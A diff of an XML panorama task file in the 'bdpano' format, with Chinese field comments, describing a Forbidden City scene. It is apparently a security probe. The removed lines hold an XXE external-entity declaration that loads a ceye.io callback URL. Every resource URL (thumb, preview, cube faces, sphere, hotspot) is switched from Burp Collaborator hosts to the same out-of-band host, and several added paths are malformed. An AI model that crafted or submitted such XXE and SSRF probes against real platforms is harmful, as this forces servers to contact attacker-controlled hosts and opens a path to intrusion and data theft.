@@ -1,10 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE root [
-<!ELEMENT foo ANY>
-<!ENTITY % remote SYSTEM "http://ip.port.6xfs4n.ceye.io/xxe_test">
-%remote;]>
 <bdpano>
-    <task name="春季风景全景图" from_url_host="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net"  > <!--name 必填。需与XR平台所提交的任务名称保持一致。from_url_host 必填。为企业官网主页-->
+    <task name="春季风景全景图" from_url_host="https://raw.githubusercontent.com/"  > <!--name 必填。需与XR平台所提交的任务名称保持一致。from_url_host 必填。为企业官网主页-->
 
         <resource name="resource_122149" title="故宫" location="北京市东城区景山前街4号" tag="高清无广告" lon="116.46" lat="39.92">
 		
@@ -17,7 +13,7 @@
                 <author name="作者：创世汇鑫"/>
                 <!--name 必填。作者信息，需保证真实，不允许出现手机号、网址、微信QQ等敏感信息-->
 
-                <layer name="scene_1622769" sid="0" title="东南门" from_url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/lCdtnP" season="春季" time="早上" weather="晴">
+                <layer name="scene_1622769" sid="0" title="东南门" from_url="http://ip.port.6xfs4n.ceye.io/xxe_testlCdtnP" season="春季" time="早上" weather="晴">
 
                     <!--layer 
                     name 必填。为场景的唯一标识。
@@ -28,32 +24,32 @@
                     weather 必填。选项：晴、多云、阴、雨、雪、雾、霜、沙尘暴、霾。根据实际情况进行选择
 					from_url 选填。表示资源来源网站的地址。可能在全景页或其他情况下进行跳转 -->
 					
-                    <thumb url="http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/thumb.jpg"/>
+                    <thumb url="http://ip.port.6xfs4n.ceye.io/xxe_test/pano/scene_1622769/pano.tiles/thumb.jpg"/>
 					
 					<!--选填：thumb 用来标记缩略图信息-->
 
-                    <preview url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/preview.jpg"/>
+                    <preview url="http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/preview.jpg"/>
 
                     <!--选填：preview 用来标记预览图信息-->
 
-                    <cube url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_%s.jpg"/>
+                    <cube url="http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_%s.jpg"/>
                     <!-- 方法一 （三种方法选填其一即可）
                      cube 必填。用来标记全景六方图信息，最少出现0次，最多出现一次，url为六方图地址，前缀为mobile，方图用l,f,r,b,u,d表示左前右后上下” -->
 					
                     <cube_group>
-                        <front url = "http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_f.jpg"/>
-                        <back url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_b.jpg"/>
-                        <up url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_u.jpg"/>
-                        <down url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_d.jpg"/>
-                        <left url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_l.jpg"/>
-                        <right url = "http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_r.jpg"/>
+                        <front url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_f.jpg"/>
+                        <back url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_b.jpg"/>
+                        <up url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_u.jpg"/>
+                        <down url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_d.jpg"/>
+                        <left url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_l.jpg"/>
+                        <right url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_r.jpg"/>
                     </cube_group>
                     <!-- 方法二 front,back,up,down,left,right 分别代表前、后、上、下、左、右-->
 
-                    <sphere url = "http://x20bbwy6jmnt6r166dtuabv5qwwnkc.burpcollaborator.net/pano/scene_1622769/pano.tiles/mobile_l.jpg"/>
+                    <sphere url = "http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/pano.tiles/mobile_l.jpg"/>
                     <!--方法三 sphere 为单张2:1全景图 -->
 
-                    <hotspot name="hotspot_0" ath="32.6640766319" atv="35.9793462799" url="http://0tuoq7iyq4wg80qb4lo4klwr6ic90y.burpcollaborator.net/pano/scene_1622769/feiting.png" txt="潜水艇" linkedscene="scene_1622768"/>
+                    <hotspot name="hotspot_0" ath="32.6640766319" atv="35.9793462799" url="http://ip.port.6xfs4n.ceye.io/xxe_testpano/scene_1622769/feiting.png" txt="潜水艇" linkedscene="scene_1622768"/>
 
                     <!--hotpot 选填。用来标识热点元素    
                           name  为热点元素唯一标识
